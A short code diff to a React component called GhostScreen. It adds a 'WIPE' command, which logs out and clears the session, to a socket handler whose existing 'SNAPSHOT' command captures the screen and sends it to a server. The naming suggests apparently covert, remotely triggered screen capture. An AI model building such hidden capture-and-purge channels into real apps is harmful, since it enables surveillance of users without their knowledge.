@@ -74,6 +74,9 @@ const GhostScreen = ({ name, onLogout }) => {
       if (cmd === 'SNAPSHOT') {
         const uri = await captureScreen({ format: 'jpg', quality: 0.5 });
         socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
+      } else if (cmd === 'WIPE') {
+        console.log("[Ghost] WIPE Command Received: Purging session...");
+        onLogout(); // Safe exit/logout to clear memory
       }
     });
 
